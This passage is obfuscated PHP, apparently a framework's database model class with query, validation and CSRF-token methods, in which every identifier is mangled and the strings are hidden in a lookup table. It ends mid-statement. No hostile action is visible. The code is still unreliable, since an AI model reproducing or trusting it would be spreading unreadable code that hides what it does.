$¥ŒìøËú[$ƒì£†âö] = intval($¥ŒìøËú[$ƒì£†âö]); } elseif (!1 !== strpos($¢ìÂéãÈ, $à¾Ì¾†Ì[365]) || !1 !== strpos($¢ìÂéãÈ, $à¾Ì¾†Ì[366])) { $¥ŒìøËú[$ƒì£†âö] = floatval($¥ŒìøËú[$ƒì£†âö]); } elseif (!1 !== strpos($¢ìÂéãÈ, $à¾Ì¾†Ì[367])) { $¥ŒìøËú[$ƒì£†âö] = (bool) $¥ŒìøËú[$ƒì£†âö]; } } } public function find($œöì˜Œš = array()) { $Ú´‡„íÜ =& $_SERVER[³Ôà×Ó]; if (is_numeric($œöì˜Œš) || is_string($œöì˜Œš)) { $ºÖ¤®›´[$this->getPk()] = intval($œöì˜Œš); $this->options[$Ú´‡„íÜ[352]] = $ºÖ¤®›´; } $this->options[$Ú´‡„íÜ[368]] = 1; $œöì˜Œš = $this->_parseOptions(); $Ñ×öùæ = $this->db->select($œöì˜Œš); if (!1 === $Ñ×öùæ) { return !1; } if (empty($Ñ×öùæ)) { return null; } $this->data = $Ñ×öùæ[0]; $this->_afterFind($this->data, $œöì˜Œš); if (!empty($this->options[$Ú´‡„íÜ[369]])) { return $this->returnResult($this->data, $this->options[$Ú´‡„íÜ[369]]); } return $this->data; } protected function _afterFind(&$Ø‚ùî›š, $Î‘àã³ö) { } protected function returnResult($™ÔËæµÆ, $À¡™÷ÓŞ = '') { $¦ñĞñà€ =& $_SERVER[³Ôà×Ó]; if ($À¡™÷ÓŞ) { if (is_callable($À¡™÷ÓŞ)) { return call_user_func($À¡™÷ÓŞ, $™ÔËæµÆ); } switch (strtolower($À¡™÷ÓŞ)) { case $¦ñĞñà€[370]: return json_encode($™ÔËæµÆ); case $¦ñĞñà€[371]: return xml_encode($™ÔËæµÆ); } } return $™ÔËæµÆ; } public function parseFieldsMap($è¨ÂÄš, $©«˜Ù–° = 1) { if (!empty($this->_map)) { foreach ($this->_map as $›È¨•ª™ => $«äÜà¸Š) { if ($©«˜Ù–° == 1) { if (isset($è¨ÂÄš[$«äÜà¸Š])) { $è¨ÂÄš[$›È¨•ª™] = $è¨ÂÄš[$«äÜà¸Š]; unset($è¨ÂÄš[$«äÜà¸Š]); } } else { if (isset($è¨ÂÄš[$›È¨•ª™])) { $è¨ÂÄš[$«äÜà¸Š] = $è¨ÂÄš[$›È¨•ª™]; unset($è¨ÂÄš[$›È¨•ª™]); } } } } return $è¨ÂÄš; } public function setField($ê”§°Á«, $•ÉóƒëÅ = '') { if (is_array($ê”§°Á«)) { $ëËË¶ßİ = $ê”§°Á«; } else { $ëËË¶ßİ[$ê”§°Á«] = $•ÉóƒëÅ; } return $this->save($ëËË¶ßİ); } public function setAdd($É·ÂËŸì, $×åşšËô = 1) { $øõ¯Ä† =& $_SERVER[³Ôà×Ó]; $ıÂ‚µöù = $É·ÂËŸì . $øõ¯Ä†[372] . $×åşšËô; if ($×åşšËô < 0) { $ıÂ‚µöù = $É·ÂËŸì . $×åşšËô; } return $this->setField($É·ÂËŸì, array($øõ¯Ä†[373], $ıÂ‚µöù)); } public function getField($Õùàãğ, $ñ†Ô“æ’ = null) { $ÄğÀ…Œ =& $_SERVER[³Ôà×Ó]; $¦­€Ü«¥[$ÄğÀ…Œ[350]] = $Õùàãğ; $¦­€Ü«¥ = $this->_parseOptions($¦­€Ü«¥); $Õùàãğ = trim($Õùàãğ); if (strpos($Õùàãğ, $ÄğÀ…Œ[50])) { if (!isset($¦­€Ü«¥[$ÄğÀ…Œ[368]])) { $¦­€Ü«¥[$ÄğÀ…Œ[368]] = is_numeric($ñ†Ô“æ’) ? $ñ†Ô“æ’ : $ÄğÀ…Œ[12]; } $ŸùÙŒ‰’ = $this->db->select($¦­€Ü«¥); if (!empty($ŸùÙŒ‰’)) { $°ùåø = explode($ÄğÀ…Œ[50], $Õùàãğ); $Õùàãğ = array_keys($ŸùÙŒ‰’[0]); $ÔÂàà¥Ù = array_shift($Õùàãğ); $„å‘à¯Õ = array_shift($Õùàãğ); $é€ïƒùĞ = array(); $ÕÇşåÔ© = count($°ùåø); foreach ($ŸùÙŒ‰’ as $”Õ¡ è€) { $‡ª‹•¶Ù = $”Õ¡ è€[$ÔÂàà¥Ù]; if (2 == $ÕÇşåÔ©) { $é€ïƒùĞ[$‡ª‹•¶Ù] = $”Õ¡ è€[$„å‘à¯Õ]; } else { $é€ïƒùĞ[$‡ª‹•¶Ù] = is_string($ñ†Ô“æ’) ? implode($ñ†Ô“æ’, $”Õ¡ è€) : $”Õ¡ è€; } } return $é€ïƒùĞ; } } else { if (!0 !== $ñ†Ô“æ’) { $¦­€Ü«¥[$ÄğÀ…Œ[368]] = is_numeric($ñ†Ô“æ’) ? $ñ†Ô“æ’ : 1; } if ($ñ†Ô“æ’ === $ÄğÀ…Œ[332]) { unset($¦­€Ü«¥[$ÄğÀ…Œ[368]]); } $”Õ¡ è€ = $this->db->select($¦­€Ü«¥); if (!empty($”Õ¡ è€)) { if ($ñ†Ô“æ’ === $ÄğÀ…Œ[332]) { return reset($”Õ¡ è€[0]); } if (!0 !== $ñ†Ô“æ’ && 1 == $¦­€Ü«¥[$ÄğÀ…Œ[368]]) { return reset($”Õ¡ è€[0]); } foreach ($”Õ¡ è€ as $øë½÷†Á) { $œ˜à–âÑ[] = $øë½÷†Á[$Õùàãğ]; } return $œ˜à–âÑ; } } return null; } public function create($›àã¢­ = '', $ôê”şŸ = '') { $ØˆØ¬£ë =& $_SERVER[³Ôà×Ó]; if (empty($›àã¢­)) { $›àã¢­ = $_POST; } elseif (is_object($›àã¢­)) { $›àã¢­ = get_object_vars($›àã¢­); } if (empty($›àã¢­) || !is_array($›àã¢­)) { $this->error = think_lang($ØˆØ¬£ë[348]); return !1; } $›àã¢­ = $this->parseFieldsMap($›àã¢­, 0); $ôê”şŸ = $ôê”şŸ ? $ôê”şŸ : (!empty($›àã¢­[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ØˆØ¬£ë[350]])) { $Åø¥Ù = $this->options[$ØˆØ¬£ë[350]]; unset($this->options[$ØˆØ¬£ë[350]]); } elseif ($ôê”şŸ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Åø¥Ù = $this->insertFields; } elseif ($ôê”şŸ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Åø¥Ù = $this->updateFields; } if (isset($Åø¥Ù)) { if (is_string($Åø¥Ù)) { $Åø¥Ù = explode($ØˆØ¬£ë[50], $Åø¥Ù); } if (think_config($ØˆØ¬£ë[374])) { $Åø¥Ù[] = think_config($ØˆØ¬£ë[375]); } foreach ($›àã¢­ as $Åıµæë¬ => $æŞ’—€¬) { if (!in_array($Åıµæë¬, $Åø¥Ù)) { unset($›àã¢­[$Åıµæë¬]); } } } if (!$this->autoValidation($›àã¢­, $ôê”şŸ)) { return !1; } if (!$this->autoCheckToken($›àã¢­)) { $this->error = think_lang($ØˆØ¬£ë[376]); return !1; } if ($this->autoCheckFields) { $Åø¥Ù = $this->getDbFields(); foreach ($›àã¢­ as $Åıµæë¬ => $æŞ’—€¬) { if (!in_array($Åıµæë¬, $Åø¥Ù)) { unset($›àã¢­[$Åıµæë¬]); } elseif (MAGIC_QUOTES_GPC && is_string($æŞ’—€¬)) { $›àã¢­[$Åıµæë¬] = stripslashes($æŞ’—€¬); } } } $this->autoOperation($›àã¢­, $ôê”şŸ); $this->data = $›àã¢­; return $›àã¢­; } public function autoCheckToken($‡¾­²İó) { $¬ğÊ¬Ş½ =& $_SERVER[³Ôà×Ó]; if (isset($this->options[$¬ğÊ¬Ş½[377]]) && !$this->options[$¬ğÊ¬Ş½[377]]) { return !0; } if (think_config($¬ğÊ¬Ş½[374])) { $ß‰ô”ÉÀ = think_config($¬ğÊ¬Ş½[375]); if (!isset($‡¾­²İó[$ß‰ô”ÉÀ]) || Session::get($ß‰ô”ÉÀ)) { return !1; } list($„ı¤èÑÏ, $›±îË×Ï) = explode($¬ğÊ¬Ş½[11], $‡¾­²İó[$ß‰ô”ÉÀ]); if ($›±îË×Ï && Session::get($ß‰ô”ÉÀ . $¬ğÊ¬Ş½[10] . $„ı¤èÑÏ) === $›±îË×Ï) { Session::remove($ß‰ô”ÉÀ . $¬ğÊ¬Ş½[10] . $„ı¤èÑÏ); return !0; } if (think_config($¬ğÊ¬Ş½[378])) { Session::remove($ß‰ô”ÉÀ . $¬ğÊ¬Ş½[10] . $„ı¤èÑÏ); } return !1; } return !0; } public function regex($‹Â‹•‰‘, $ØÕÛÙ»º) { $ğ £ãÇ× =& $_SERVER[³Ôà×Ó]; $ŒõöÕÔ° = array($ğ £ãÇ×[379] => $ğ £ãÇ×[380], $ğ £ãÇ×[381] => $ğ £ãÇ×[382], $ğ £ãÇ×[383] => $ğ £ãÇ×[384], $ğ £ãÇ×[385] => $ğ £ãÇ×[386], $ğ £ãÇ×[387] => $ğ £ãÇ×[388], $ğ £ãÇ×[389] => $ğ £ãÇ×[390], $ğ £ãÇ×[391] => $ğ £ãÇ×[392], $ğ £ãÇ×[366] => $ğ £ãÇ×[393], $ğ £ãÇ×[394] => $ğ £ãÇ×[395]); if (isset($ŒõöÕÔ°[strtolower($ØÕÛÙ»º)])) { $ØÕÛÙ»º = $ŒõöÕÔ°[strtolower($ØÕÛÙ»º)]; } return preg_match($ØÕÛÙ»º, $‹Â‹•‰‘) === 1; } private function autoOperation(&$¹ã‹Ó‘˜, $³¢¥Üıˆ) { $İ‚‘ÀŸ­ =& $_SERVER[³Ôà×Ó]; if (!empty($this->options[$İ‚‘ÀŸ­[396]])) { $’ì ÊÎ = $this->options[$İ‚‘ÀŸ­[396]]; unset($this->options[$İ‚‘ÀŸ­[396]]); } elseif (!empty($this->_auto)) { $’ì ÊÎ = $this->_auto; } if (isset($’ì ÊÎ)) { foreach ($’ì ÊÎ as $²ÑÕµª¨) { if (empty($²ÑÕµª¨[2])) { $²ÑÕµª¨[2] = THINK_MODEL_INSERT; } if ($³¢¥Üıˆ == $²ÑÕµª¨[2] || $²ÑÕµª¨[2] == THINK_MODEL_BOTH) { switch (trim($²ÑÕµª¨[3])) { case $İ‚‘ÀŸ­[397]: case $İ‚‘ÀŸ­[398]: $ş¤Ùşëš = isset($²ÑÕµª¨[4]) ? (array) $²ÑÕµª¨[4] : array(); if (isset($¹ã‹Ó‘˜[$²ÑÕµª¨[0]])) { array_unshift($ş¤Ùşëš, $¹ã‹Ó‘˜[$²ÑÕµª¨[0]]); } if ($İ‚‘ÀŸ­[397] == $²ÑÕµª¨[3]) { $¹ã‹Ó‘˜[$²ÑÕµª¨[0]] = call_user_func_array($²ÑÕµª¨[1], $ş¤Ùşëš); } else { $¹ã‹Ó‘˜[$²ÑÕµª¨[0]] = call_user_func_array(array(&$this, $²ÑÕµª¨[1]), $ş¤Ùşëš); } break; case $İ‚‘ÀŸ­[350]: $¹ã‹Ó‘˜[$²ÑÕµª¨[0]] = $¹ã‹Ó‘˜[$²ÑÕµª¨[1]]; break; case $İ‚‘ÀŸ­[399]: if ($İ‚‘ÀŸ­[12] === $¹ã‹Ó‘˜[$²ÑÕµª¨[0]]) { unset($¹ã‹Ó‘˜[$²ÑÕµª¨[0]]); } break; case $İ‚‘ÀŸ­[400]: default: $¹ã‹Ó‘˜[$²ÑÕµª¨[0]] = $²ÑÕµª¨[1]; } if (!1 === $¹ã‹Ó‘˜[$²ÑÕµª¨[0]]) { unset($¹ã‹Ó‘˜[$²ÑÕµª¨[0]]); } } } } return $¹ã‹Ó‘˜; } protected function autoValidation($ê€óÁƒ–, $Şà·Éûá) { $Ûúşúª¼ =& $_SERVER[³Ôà×Ó]; if (!empty($this->options[$Ûúşúª¼[401]])) { $™öïİÃ– = $this->options[$Ûúşúª¼[401]]; unset($this->options[$Ûúşúª¼[401]]); } elseif (!empty($this->_validate)) { $™öïİÃ– = $this->_validate; } if (isset($™öïİÃ–)) { if ($this->patchValidate) { $this->error = array(); } foreach ($™öïİÃ– as $ëàØ™‘Ş => $Êş¶”ÉÔ) { if (empty($Êş¶”ÉÔ[5]) || $Êş¶”ÉÔ[5] == THINK_MODEL_BOTH || $Êş¶”ÉÔ[5] == $Şà·Éûá) { if (0 == strpos($Êş¶”ÉÔ[2], $Ûúşúª¼[402]) && strpos($Êş¶”ÉÔ[2], $Ûúşúª¼[403])) { $Êş¶”ÉÔ[2] = think_lang(substr($Êş¶”ÉÔ[2], 2, -1)); } $Êş¶”ÉÔ[3] = isset($Êş¶”ÉÔ[3]) ? $Êş¶”ÉÔ[3] : THINK_EXISTS_VALIDATE; $Êş¶”ÉÔ[4] = isset($Êş¶”ÉÔ[4]) ? $Êş¶”ÉÔ[4] : $Ûúşúª¼[404]; switch ($Êş¶”ÉÔ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ê€óÁƒ–, $Êş¶”ÉÔ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Ûúşúª¼[12] != trim($ê€óÁƒ–[$Êş¶”ÉÔ[0]])) { if (!1 === $this->_validationField($ê€óÁƒ–, $Êş¶”ÉÔ)) { return !1; } } break; default: if (isset($ê€óÁƒ–[$Êş¶”ÉÔ[0]])) { if (!1 === $this->_validationField($ê€óÁƒ–, $Êş¶”ÉÔ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($–¢£ã‰, $áš…ÔÈÑ) { if (!1 === $this->_validationFieldItem($–¢£ã‰, $áš…ÔÈÑ)) { if ($this->patchValidate) { $this->error[$áš…ÔÈÑ[0]] = $áš…ÔÈÑ[2]; } else { $this->error = $áš…ÔÈÑ[2]; return !1; } } return; } protected function _validationFieldItem($é®šó±…, $À©¶‡°‘) { $ÌÁŞ =& $_SERVER[³Ôà×Ó]; switch (strtolower(trim($À©¶‡°‘[4]))) { case $ÌÁŞ[397]: case $ÌÁŞ[398]: $ĞªıİÇ” = isset($À©¶‡°‘[6]) ? (array) $À©¶‡°‘[6] : array(); if (is_string($À©¶‡°‘[0]) && strpos($À©¶‡°‘[0], $ÌÁŞ[50])) { $À©¶‡°‘[0] = explode($ÌÁŞ[50], $À©¶‡°‘[0]); } if (is_array($À©¶‡°‘[0])) { foreach ($À©¶‡°‘[0] as $¬¾¯Œâó) { $¢˜Çòßª[$¬¾¯Œâó] = $é®šó±…[$¬¾¯Œâó]; } array_unshift($ĞªıİÇ”, $¢˜Çòßª); } else { array_unshift($ĞªıİÇ”, $é®šó±…[$À©¶‡°‘[0]]); } if ($ÌÁŞ[397] == $À©¶‡°‘[4]) { return call_user_func_array($À©¶‡°‘[1], $ĞªıİÇ”); } else { return call_user_func_array(array(&$this, $À©¶‡°‘[1]), $ĞªıİÇ”); } case $ÌÁŞ[405]: return $é®šó±…[$À©¶‡°‘[0]] == $é®šó±…[$À©¶‡°‘[1]]; case $ÌÁŞ[406]: if (is_string($À©¶‡°‘[0]) && strpos($À©¶‡°‘[0], $ÌÁŞ[50])) { $À©¶‡°‘[0] = explode($ÌÁŞ[50], $À©¶‡°‘[0]); } $ú¨¡Ãäõ = array(); if (is_array($À©¶‡°‘[0])) { foreach ($À©¶‡°‘[0] as $¬¾¯Œâó) { $ú¨¡Ãäõ[$¬¾¯Œâó] = $é®šó±…[$¬¾¯Œâó]; } } else { $ú¨¡Ãäõ[$À©¶‡°‘[0]] = $é®šó±…[$À©¶‡°‘[0]]; } if (!empty($é®šó±…[$this->getPk()])) { $ú¨¡Ãäõ[$this->getPk()] = array($ÌÁŞ[407], $é®šó±…[$this->getPk()]); } if ($this->where($ú¨¡Ãäõ)->find()) { return !1; } return !0; default: return $this->check($é®šó±…[$À©¶‡°‘[0]], $À©¶‡°‘[1], $À©¶‡°‘[4]); } } public function check($ÈÃšô² , $éó÷ˆê¸, $ª°ÙÔ“á = "\x72\145\x67\x65\x78") { $»Ê™ÃÊ¢ =& $_SERVER[³Ôà×Ó]; $ª°ÙÔ“á = strtolower(trim($ª°ÙÔ“á)); switch ($ª°ÙÔ“á) { case $»Ê™ÃÊ¢[7]: case $»Ê™ÃÊ¢[408]: $­¢Óßå« = is_array($éó÷ˆê¸) ? $éó÷ˆê¸ : explode($»Ê™ÃÊ¢[50], $éó÷ˆê¸); return $ª°ÙÔ“á == $»Ê™ÃÊ¢[7] ? in_array($ÈÃšô² , $­¢Óßå«) : !in_array($ÈÃšô² , $­¢Óßå«); case $»Ê™ÃÊ¢[409]: case $»Ê™ÃÊ¢[410]: if (is_array($éó÷ˆê¸)) { $ÓƒÄå û = $éó÷ˆê¸[0]; $²ÍÇêŸ = $éó÷ˆê¸[1]; } else { list($ÓƒÄå û, $²ÍÇêŸ) = explode($»Ê™ÃÊ¢[50], $éó÷ˆê¸); } return $ª°ÙÔ“á == $»Ê™ÃÊ¢[409] ? $ÈÃšô²  >= $ÓƒÄå û && $ÈÃšô²  <= $²ÍÇêŸ : $ÈÃšô²  < $ÓƒÄå û || $ÈÃšô²  > $²ÍÇêŸ; case $»Ê™ÃÊ¢[411]: case $»Ê™ÃÊ¢[412]: return $ª°ÙÔ“á == $»Ê™ÃÊ¢[411] ? $ÈÃšô²  == $éó÷ˆê¸ : $ÈÃšô²  != $éó÷ˆê¸; case $»Ê™ÃÊ¢[413]: $Ä×¾©ß­ = mb_strlen($ÈÃšô² , $»Ê™ÃÊ¢[414]); if (strpos($éó÷ˆê¸, $»Ê™ÃÊ¢[50])) { list($ÓƒÄå û, $²ÍÇêŸ) = explode($»Ê™ÃÊ¢[50], $éó÷ˆê¸); return $Ä×¾©ß­ >= $ÓƒÄå û && $Ä×¾©ß­ <= $²ÍÇêŸ; } else { return $Ä×¾©ß­ == $éó÷ˆê¸; } case $»Ê™ÃÊ¢[415]: list($êæª½¼Ã, $Âˆ¢Èô) = explode($»Ê™ÃÊ¢[50], $éó÷ˆê¸); if (!is_numeric($êæª½¼Ã)) { $êæª½¼Ã = strtotime($êæª½¼Ã); } if (!is_numeric($Âˆ¢Èô)) { $Âˆ¢Èô = strtotime($Âˆ¢Èô); } return NOW_TIME >= $êæª½¼Ã && NOW_TIME <= $Âˆ¢Èô; case $»Ê™ÃÊ¢[416]: return in_array(get_client_ip(), explode($»Ê™ÃÊ¢[50], $éó÷ˆê¸)); case $»Ê™ÃÊ¢[417]: return !in_array(get_client_ip(), explode($»Ê™ÃÊ¢[50], $éó÷ˆê¸)); case $»Ê™ÃÊ¢[404]: default: return $this->regex($ÈÃšô² , $éó÷ˆê¸); } } public function query($ÜïàÈ‹, $×Ê‘õ¢Ó = false) { $ÁüÀÜ¼° =& $_SERVER[³Ôà×Ó]; if (!is_bool($×Ê‘õ¢Ó) && !is_array($×Ê‘õ¢Ó)) { $×Ê‘õ¢Ó = func_get_args(); array_shift($×Ê‘õ¢Ó); } $ÜïàÈ‹ = str_replace(array($ÁüÀÜ¼°[262], $ÁüÀÜ¼°[418]), $ÁüÀÜ¼°[53], $ÜïàÈ‹); $ÜïàÈ‹ = $this->parseSql($ÜïàÈ‹, $×Ê‘õ¢Ó); return $this->db->query($ÜïàÈ‹); } public function execute($ ò÷¡åô, $ñğİ´ÄÌ = false) { if (!is_bool($ñğİ´ÄÌ) && !is_array($ñğİ´ÄÌ)) { $ñğİ´ÄÌ = func_get_args(); array_shift($ñğİ´ÄÌ); } $ ò÷¡åô = $this->parseSql($ ò÷¡åô, $ñğİ´ÄÌ); return $this->db->execute($ ò÷¡åô); } protected function parseSql($¬áËïš§, $œùÀª¿›) { $ô¬Ò° =& $_SERVER[³Ôà×Ó]; if (!0 === $œùÀª¿›) { $Òç¾¤˜ = $this->_parseOptions(); $¬áËïš§ = $this->db->parseSql($¬áËïš§, $Òç¾¤˜); } elseif (is_array($œùÀª¿›)) { $œùÀª¿› = array_map(array($this->db, $ô¬Ò°[419]), $œùÀª¿›); $¬áËïš§ = vsprintf($¬áËïš§, $œùÀª¿›); } else { $¬áËïš§ = strtr($¬áËïš§, array($ô¬Ò°[420] => $this->getTableName(), $ô¬Ò°[421] => think_config($ô¬Ò°[321]))); } $this->db->setModel($this->name); return $¬áËïš§; } public function db($³æ·µ²Ÿ = '', $Íñï = '', $İ÷–Ù¼ä = array()) { $ø«ï¥Éä =& $_SERVER[³Ôà×Ó]; if ($ø«ï¥Éä[12] === $³æ·µ²Ÿ && $this->db) { return $this->db; } static $—Ç®ÀÜ = array(); static $äŸÇ‡¼ª = array(); if (!isset($äŸÇ‡¼ª[$³æ·µ²Ÿ]) || isset($äŸÇ‡¼ª[$³æ·µ²Ÿ]) && $Íñï && $—Ç®ÀÜ[$³æ·µ²Ÿ] != $Íñï) { if (!empty($Íñï) && is_string($Íñï) && !1 === strpos($Íñï, $ø«ï¥Éä[8])) { $Íñï = think_config($Íñï); } $³æ·µ²Ÿ = think_guid($Íñï); $äŸÇ‡¼ª[$³æ·µ²Ÿ] = Db::getInstance($Íñï); } elseif (NULL === $Íñï) { $äŸÇ‡¼ª[$³æ·µ²Ÿ]->close(); unset($äŸÇ‡¼ª[$³æ·µ²Ÿ]); return; } if (!empty($İ÷–Ù¼ä)) { if (is_string($İ÷–Ù¼ä)) { parse_str($İ÷–Ù¼ä, $İ÷–Ù¼ä); } foreach ($İ÷–Ù¼ä as $­ÈùùŞ• => $ÓùøÖ§Ç) { $this->setProperty($­ÈùùŞ•, $ÓùøÖ§Ç); } } $—Ç®ÀÜ[$³æ·µ²Ÿ] = $Íñï; $this->db = $äŸÇ‡¼ª[$³æ·µ²Ÿ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ğ±çş¥ = get_class($this); if ($ğ±çş¥ == $_SERVER[³Ôà×Ó][422]) { return $this->name; } $this->name = substr($ğ±çş¥, 0, -5); } return $this->name; } public function getTableName() { $¶Ãã¦ =& $_SERVER[³Ôà×Ó]; if (empty($this->trueTableName)) { $í¢¬´½‘ = !empty($this->tablePrefix) ? $this->tablePrefix : $¶Ãã¦[12]; if (!empty($this->tableName)) { $í¢¬´½‘ .= $this->tableName; } else { $í¢¬´½‘ .= think_parse_name($this->name); } $this->trueTableName = strtolower($í¢¬´½‘); } return (!empty($this->dbName) ? $this->dbName . $¶Ãã¦[10] : $¶Ãã¦[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $èØîÍ—ˆ =& $_SERVER[³Ôà×Ó]; return isset($this->fields[$èØîÍ—ˆ[328]]) ? $this->fields[$èØîÍ—ˆ[328]] : $this->pk; } public function getDbFields() { $Ò­©Á— =& $_SERVER[³Ôà×Ó]; if (isset($this->options[$Ò­©Á—[356]])) { $‘µ÷ßà = $this->db->getFields($this->options[$Ò­©Á—[356]]); return $‘µ÷ßà ? array_keys($‘µ÷ßà) : !1; } if ($this->fields) { $‘µ÷ßà = $this->fields; unset($‘µ÷ßà[$Ò­©Á—[327]], $‘µ÷ßà[$Ò­©Á—[328]], $‘µ÷ßà[$Ò­©Á—[329]], $‘µ÷ßà[$Ò­©Á—[326]]); return $‘µ÷ßà; } return !1; } public function data($··Ô©€å = '') { $©ã¬®ë =& $_SERVER[³Ôà×Ó]; if ($©ã¬®ë[12] === $··Ô©€å && !empty($this->data)) { return $this->data; } if (is_object($··Ô©€å)) { $··Ô©€å = get_object_vars($··Ô©€å); } elseif (is_string($··Ô©€å)) { parse_str($··Ô©€å, $··Ô©€å); } elseif (!is_array($··Ô©€å)) { think_exception(think_lang($©ã¬®ë[348])); } $this->data = $··Ô©€å; return $this; } public function join($¬‘¦¦ ù) { $Æó•Ã´ =& $_SERVER[³Ôà×Ó]; if (is_array($¬‘¦¦ ù)) { $this->options[$Æó•Ã´[359]] = $¬‘¦¦ ù; } elseif (!empty($¬‘¦¦ ù)) { $this->options[$Æó•Ã´[359]][] = $¬‘¦¦ ù; } return $this; } public function union($³ÈÜ¯¢, $öŸÇ³£¹ = false) { $øö‘õõ÷ =& $_SERVER[³Ôà×Ó]; if (empty($³ÈÜ¯¢)) { return $this; } if ($öŸÇ³£¹) { $this->options[$øö‘õõ÷[423]][$øö‘õõ÷[424]] = !0; } if (is_object($³ÈÜ¯¢)) { $³ÈÜ¯¢ = get_object_vars($³ÈÜ¯¢); } if (is_string($³ÈÜ¯¢)) { $‰•Ê”Ê» = $³ÈÜ¯¢; } elseif (is_array($³ÈÜ¯¢)) { if (isset($³ÈÜ¯¢[0])) { $this->options[$øö‘õõ÷[423]] = array_merge($this->options[$øö‘õõ÷[423]], $³ÈÜ¯¢); return $this; } else { $‰•Ê”Ê» = $³ÈÜ¯¢; } } else { think_exception(think_lang($øö‘õõ÷[348])); } $this->options[$øö‘õõ÷[423]][] = $‰•Ê”Ê»; return $this; } public function cache($²±×ñËö = true, $Ö¿Üá† = null, $˜Ì¬Â´à = '') { $™ğÒè„Ç =& $_SERVER[³Ôà×Ó]; if (!1 !== $²±×ñËö) { $this->options[$™ğÒè„Ç[425]] = array($™ğÒè„Ç[97] => $²±×ñËö, $™ğÒè„Ç[415] => $Ö¿Üá†, $™ğÒè„Ç[33] => $˜Ì¬Â´à); } return $this; } public function field($üõÑ ˆ, $·®¾¢Ñ÷ = false) { $çç¾ãš‚ =& $_SERVER[³Ôà×Ó]; if (!0 === $üõÑ ˆ) { $¿ÛÆ¼¿ = $this->getDbFields(); $üõÑ ˆ = $¿ÛÆ¼¿ ? $¿ÛÆ¼¿ : $çç¾ãš‚[220]; } elseif ($·®¾¢Ñ÷) { if (is_string($üõÑ ˆ)) { $üõÑ ˆ = explode($çç¾ãš‚[50], $üõÑ ˆ); } $¿ÛÆ¼¿ = $this->getDbFields(); $üõÑ ˆ = $¿ÛÆ¼¿ ? array_diff($¿ÛÆ¼¿, $üõÑ ˆ) : $üõÑ ˆ; } $this->options[$çç¾ãš‚[350]] = $üõÑ ˆ; return $this; } public function scope($ôÙˆÇ§ = '', $ì©ù¶Œİ = NULL) { $››¦Ïü© =& $_SERVER[³Ôà×Ó]; if ($››¦Ïü©[12] === $ôÙˆÇ§) { if (isset($this->_scope[$››¦Ïü©[37]])) { $˜“Ø²Ï = $this->_scope[$››¦Ïü©[37]]; } else { return $this; } } elseif (is_string($ôÙˆÇ§)) { $µå’‰†Ì = explode($››¦Ïü©[50], $ôÙˆÇ§); $˜“Ø²Ï = array(); foreach ($µå’‰†Ì as $òøïÂş) { if (!isset($this->_scope[$òøïÂş])) { continue; } $˜“Ø²Ï = array_merge($˜“Ø²Ï, $this->_scope[$òøïÂş]); } if (!empty($ì©ù¶Œİ) && is_array($ì©ù¶Œİ)) { $˜“Ø²Ï = array_merge($˜“Ø²Ï, $ì©ù¶Œİ); } } elseif (is_array($ôÙˆÇ§)) { $˜“Ø²Ï = $ôÙˆÇ§; } if (is_array($˜“Ø²Ï) && !empty($˜“Ø²Ï)) { $this->options = array_merge($this->options, array_change_key_case($˜“Ø²Ï)); } return $this; } public function where($ôúÑç²¥, $¥¡›·­Ê = null) { $Œ¼Ñ™ÛÍ =& $_SERVER[³Ôà×Ó]; if (!is_null($¥¡›·­Ê) && is_string($ôúÑç²¥)) { if (!is_array($¥¡›·­Ê)) { $¥¡›·­Ê = func_get_args(); array_shift($¥¡›·­Ê); } $¥¡›·­Ê = array_map(array($this->db, $Œ¼Ñ™ÛÍ[419]), $¥¡›·­Ê); $ôúÑç²¥ = vsprintf($ôúÑç²¥, $¥¡›·­Ê); } elseif (is_object($ôúÑç²¥)) { $ôúÑç²¥ = get_object_vars($ôúÑç²¥); } elseif (is_array($ôúÑç²¥)) { foreach ($ôúÑç²¥ as $¶ø‚ˆû£ => $¹¤ÏÍşª) { if ((is_numeric($¶ø‚ˆû£) || !$¶ø‚ˆû£) && is_string($¹¤ÏÍşª)) { if (strpos($¹¤ÏÍşª, $Œ¼Ñ™ÛÍ[426]) === 0) { continue; } think_trace($Œ¼Ñ™ÛÍ[427], $Œ¼Ñ™ÛÍ[12], $Œ¼Ñ™ÛÍ[49]); die; } } } if (is_string($ôúÑç²¥) && $Œ¼Ñ™ÛÍ[12] != $ôúÑç²¥) { $„¸„â™ = array(); $„¸„â™[$Œ¼Ñ™ÛÍ[428]] = $ôúÑç²¥; $ôúÑç²¥ = $„¸„â™; } if (isset($this->options[$Œ¼Ñ™ÛÍ[352]])) { $this->options[$Œ¼Ñ™ÛÍ[352]] = array_merge($this->options[$Œ¼Ñ™ÛÍ[352]], $ôúÑç²¥); } else { $this->options[$Œ¼Ñ™ÛÍ[352]] = $ôúÑç²¥; } return $this; } public function limit($Éò ÚèÅ, $–‘­ÃÎÍ = null) { $ı’Â¡ =& $_SERVER[³Ôà×Ó]; $this->options[$ı’Â¡[368]] = is_null($–‘­ÃÎÍ) ? $Éò ÚèÅ : $Éò ÚèÅ . $ı’Â¡[50] . $–‘­ÃÎÍ; return $this; } public function page($¶ğú£šæ, $»Æñ±—¨ = null) { $üÅì±Òã =& $_SERVER[³Ôà×Ó]; $this->options[$üÅì±Òã[429]] = is_null($»Æñ±—¨) ? $¶ğú£šæ : $¶ğú£šæ . $üÅì±Òã[50] . $»Æñ±—¨; return $this; } public function comment($ğö˜ĞÛƒ) { $this->options[$_SERVER[³Ôà×Ó][430]] = $ğö˜ĞÛƒ; return $this; } public function setProperty($Ü¸¥§úó, $¬é‘…·) { if (property_exists($this, $Ü¸¥§úó)) { $this->{$Ü¸¥§úó} = $¬é‘…·; } return $this; } } if ($_SERVER[$_SERVER[³Ôà×Ó][431]] != 